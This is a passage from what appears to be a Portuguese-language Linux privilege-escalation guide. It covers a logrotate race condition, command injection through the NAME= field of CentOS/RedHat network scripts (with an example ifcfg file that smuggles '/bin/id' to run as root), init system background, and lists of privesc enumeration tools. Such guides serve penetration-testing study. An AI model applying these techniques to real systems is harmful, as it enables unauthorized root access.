Uma vulnerabilidade em `logrotate` permite que usuários com **permissões de escrita** em um arquivo de log ou em seus diretórios pai possivelmente obtenham privilégios escalados. Isso ocorre porque `logrotate`, frequentemente executado como **root**, pode ser manipulado para executar arquivos arbitrários, especialmente em diretórios como _**/etc/bash_completion.d/**_. É importante verificar permissões não só em _/var/log_ mas também em qualquer diretório onde a rotação de logs seja aplicada.

> [!TIP]
> Esta vulnerabilidade afeta `logrotate` versão `3.18.0` e anteriores

Mais informações detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Você pode explorar esta vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidade é muito semelhante à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** então sempre que você encontrar que pode alterar logs, verifique quem está gerenciando esses logs e veja se consegue escalar privilégios substituindo os logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, por qualquer motivo, um usuário for capaz de **escrever** um script `ifcf-<whatever>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então seu **system is pwned**.

Network scripts, _ifcg-eth0_ por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. Entretanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o atributo `NAME=` nesses network scripts não é tratado corretamente. Se você tiver **espaço em branco no nome o sistema tenta executar a parte após o espaço em branco**. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.

Por exemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Observe o espaço em branco entre Network e /bin/id_)

### **init, init.d, systemd, and rc.d**

O diretório `/etc/init.d` abriga **scripts** do System V init (SysVinit), o **clássico sistema de gerenciamento de serviços do Linux**. Ele inclui scripts para `start`, `stop`, `restart`, e às vezes `reload` serviços. Estes podem ser executados diretamente ou através de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo em sistemas Redhat é `/etc/rc.d/init.d`.

Por outro lado, `/etc/init` está associado ao **Upstart**, um **gerenciador de serviços** mais novo introduzido pelo Ubuntu, que usa arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para Upstart, scripts SysVinit ainda são utilizados juntamente com configurações Upstart devido a uma camada de compatibilidade no Upstart.

**systemd** surge como um gerenciador moderno de inicialização e serviços, oferecendo recursos avançados como início de daemons sob demanda, gerenciamento de montagem automática e instantâneos do estado do sistema. Ele organiza arquivos em `/usr/lib/systemd/` para pacotes de distribuição e `/etc/systemd/system/` para modificações do administrador, simplificando o processo de administração do sistema.

## Outros Truques

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks normalmente hook uma syscall para expor funcionalidades privilegiadas do kernel a um gerenciador em userspace. Autenticação fraca do gerenciador (ex.: verificações de assinatura baseadas em FD-order ou esquemas de senha fracos) pode permitir que um app local se faça passar pelo gerenciador e escale para root em dispositivos já rootados. Saiba mais e detalhes de exploração aqui:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Proteções de Segurança do Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mais ajuda

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Ferramentas Linux/Unix para Privesc

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilação de mais scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referências

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
